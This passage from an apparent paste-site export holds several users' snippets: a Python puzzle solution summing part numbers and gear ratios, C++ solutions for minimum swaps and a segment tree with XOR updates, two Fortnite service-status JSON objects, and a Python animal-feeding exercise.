    sym.append([m.start() for m in re.finditer(r'[^\d.]', line)])
    gear.append([m.start() for m in re.finditer(r'\*', line)])

for i, x in enumerate(num):
    for n, s, e in x:
        if ((s - 1 in sym[i]) or (e + 1 in sym[i]) or
                (i != len(num) - 1 and any(x in sym[i + 1] for x in range(s - 1, e + 2))) or
                (i != 0 and any(x in sym[i - 1] for x in range(s - 1, e + 2)))):
            part1 += n
  
for i in range(1,len(num)-1):
    for g in gear[i]:
        r = range(g - 1, g + 2)
        boh = {(n,s,e) for n, s, e in num[i] if s - 1 == g or e + 1 == g} | {(n,s,e) for n, s, e in num[i - 1] if s in r or e in r} | {(n,s,e) for n, s, e in num[i + 1] if s in r or e in r}
        if len(boh) == 2:
            prod = 1
            for n,s,e in boh:
                prod *= n
            part2+=prod

print(part1,part2)
"
y3edQt6Z,Minimum Swaps to Sort,jayati,C++,Sunday 3rd of December 2023 05:28:42 AM CDT,"//{ Driver Code Starts
#include<bits/stdc++.h>
using namespace std;

// } Driver Code Ends


class Solution 
{
    public:
    //Function to find the minimum number of swaps required to sort the array. 
	int minSwaps(vector<int>&nums)
	{
	    // Code here
	    vector<int> sortnum;
	    int mx=*max_element(nums.begin(),nums.end());
	    int arr[mx+1]={0};
	    for(int i=0;i<nums.size();i++)
	    {
	        arr[nums[i]]=1;
	    }
	    for(int i=0;i<mx+1;i++)
	    {
	        if(arr[i]==1)
	        {
	             sortnum.push_back(i);
	        }
	       
	    }
	    
	    int c=0;
	    unordered_map<int,int> m;
	    for(int i=0;i<nums.size();i++)
	    {
	        m[nums[i]]=i;
	    }
	    for(int i=0;i<nums.size();i++)
	    {
	        if(nums[i]!=sortnum[i])
	        {
	            int pos=m[sortnum[i]];
	            m[nums[i]]=pos;
	            m[nums[pos]]=i;
	         
	            swap(nums[i],nums[pos]);
	            
	            c++;
	            
	        }
	    }
	    return c;
	}
};

//{ Driver Code Starts.
int main(){
	int tc;
	cin >> tc;
	while(tc--){
		int n;
		cin >> n;
		vector<int>nums(n);
		for(int i = 0; i < n; i++)
			cin >> nums[i];
		Solution obj;
		int ans = obj.minSwaps(nums);
		cout << ans <<""\n"";
	}
	return 0;
}
// } Driver Code Ends"
00kxPfVc,Untitled,ProgMe,C++,Sunday 3rd of December 2023 05:18:53 AM CDT,"#include <bits/stdc++.h>

#define int int64_t

using namespace std;

const int N = 1e5 + 15;

int n;

int a[N];
int lazy[N * 4];
int t[N * 4][8];

void recalc (int v, int val) {
    int cnt[8]{};
    for (int i = 0; i < 8; i++) {
        cnt[i ^ val] = t[v][i];
    }
    for (int i = 0; i < 8; i++)
        t[v][i] = cnt[i];
}

void push (int v) {
    if ((v<<1|1) < 400'004 && lazy[v]) {
        lazy[v<<1|1] ^= lazy[v];
        lazy[v<<1] ^= lazy[v];
        recalc(v<<1, lazy[v]);
        recalc(v<<1|1, lazy[v]);
        lazy[v] = 0;
    }
}

void build (int v, int tl, int tr) {
    if (tl == tr) {
        t[v][a[tl]] = 1;
        return;
    }
    int tm = (tl + tr)>>1;
    build(v<<1, tl, tm);
    build(v<<1|1, tm + 1, tr);
    for (int i = 0; i < 8; i++)
        t[v][i] = t[v<<1][i] + t[v<<1|1][i];
}

void update (int v, int tl, int tr, int l, int r, int val) {
    if (l > r) {
        return;
    }
    push(v);
    if (l == tl && r == tr) {
        recalc(v, val);
        lazy[v] = val;
        return;
    }
    int tm = (tl + tr)>>1;
    update(v<<1, tl, tm, l, min(r, tm), val);
    update(v<<1|1, tm + 1, tr, max(l, tm + 1), r, val);
    for (int i = 0; i < 8; i++)
        t[v][i] = t[v<<1][i] + t[v<<1|1][i];
}

int get (int v, int tl, int tr, int l, int r, int val) {
    push(v);
    if (l > r || t[v][val] == 0)
        return LLONG_MAX;
    if (tl == tr) {
        return tl;
    }
    int tm = (tl + tr)>>1;
    int cur = get (v<<1, tl, tm, l, min(r, tm), val);
    if (cur != LLONG_MAX)
        return cur;
    return get(v<<1|1, tm + 1, tr, max(tm + 1, l), r, val);
}

int get (int left, int right) {
    int last[8][8];
    for (auto & i : last) {
        for (auto & j : i)
            j = LLONG_MAX;
    }
    for (int i = 0; i <= 7; i++) {
        last[0][i] = get(1, 0, n - 1, left, right, i);
        if (i > 0)
            last[0][i] = min(last[0][i], last[0][i - 1]);
    }
    for (int len = 1; len <= 7; len++) {
        for (int j = len; j <= 7; j++) {
            last[len][j] = min(get(1, 0, n - 1, last[len - 1][j - 1], right, j), last[len][j - 1]);
        }
    }
    for (int len = 7; len > -1; len--) {
        for (int i = 0; i <= 7; i++) {
            if (last[len][i] != LLONG_MAX)
                return len + 1;
        }
    }
    return 1;
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int q;
    cin >> n >> q;
    for (int i = 0; i < n; i++) {
        cin >> a[i];
    }
    build(1, 0, n - 1);
    while (q--) {
        string tp;
        cin >> tp;
        if (tp == ""xor"") {
            int l, r, x;
            cin >> l >> r >> x;
            l--, r--;
            update(1, 0, n - 1, l, r, x);
        } else {
            int l, r;
            cin >> l >> r;
            l--, r--;
            cout << get(l, r) << '\n';
        }
    }
}"
yb3hSN5c,fn_lightswitch_fortnite_status,AndroidGenius,JSON,Sunday 3rd of December 2023 04:54:32 AM CDT,"[
   {
      ""allowedActions"" : [],
      ""banned"" : false,
      ""launcherInfoDTO"" : {
         ""appName"" : ""Fortnite"",
         ""catalogItemId"" : ""4fe75bbc5a674f4f9b356b5c90567da5"",
         ""namespace"" : ""fn""
      },
      ""maintenanceUri"" : null,
      ""message"" : ""Fortnite is online"",
      ""overrideCatalogIds"" : [ ""a7f138b2e51945ffbfdacc1af0541053"" ],
      ""serviceInstanceId"" : ""fortnite"",
      ""status"" : ""UP"",
   }
]"
Wzv1baTF,fn_lightswitch_bulk_status,AndroidGenius,JSON,Sunday 3rd of December 2023 04:53:24 AM CDT,"[
   {
      ""allowedActions"" : [ ""PLAY"", ""DOWNLOAD"" ],
      ""banned"" : false,
      ""launcherInfoDTO"" : {
         ""appName"" : ""Fortnite"",
         ""catalogItemId"" : ""4fe75bbc5a674f4f9b356b5c90567da5"",
         ""namespace"" : ""fn""
      },
      ""maintenanceUri"" : null,
      ""message"" : ""fortnite is up."",
      ""overrideCatalogIds"" : [ ""a7f138b2e51945ffbfdacc1af0541053"" ],
      ""serviceInstanceId"" : ""fortnite"",
      ""status"" : ""UP"",
   }
]"
wtYm9Mp2,Untitled,pacho_the_python,Python,Sunday 3rd of December 2023 04:52:39 AM CDT,"areas_with_animals = {}
while True:
    command = input()
    if command == ""EndDay"":
        break
    instructions = command.split("": "")
    action = instructions[0]
    if action == ""Add"":
        tokens = instructions[1].split(""-"")
        animal_name, needed_food, area = tokens[0], int(tokens[1]), tokens[2]
        if area not in areas_with_animals.keys():
            areas_with_animals[area] = {}
        if animal_name not in areas_with_animals[area]:
            areas_with_animals[area][animal_name] = needed_food
        else:
            areas_with_animals[area][animal_name] += needed_food

    elif action == ""Feed"":
        tokens = instructions[1].split(""-"")
        animal_name, food_given = tokens[0], int(tokens[1])
        for area, animals in areas_with_animals.items():
            if animal_name in animals.keys():
                areas_with_animals[area][animal_name] -= food_given
                if areas_with_animals[area][animal_name] <= 0:
                    print(f""{animal_name} was successfully fed"")
                    del areas_with_animals[area][animal_name]

print(""Animals:"")
for key, value in areas_with_animals.items():
    for animal in value.keys():
        print(f""{animal} -> {areas_with_animals[key][animal]}g"")
print(""Areas with hungry animals:"")
for area, animals in areas_with_animals.items():
    hungry_animals = len(animals)
    if hungry_animals > 0:
        print(f""{area}: {hungry_animals}"")"
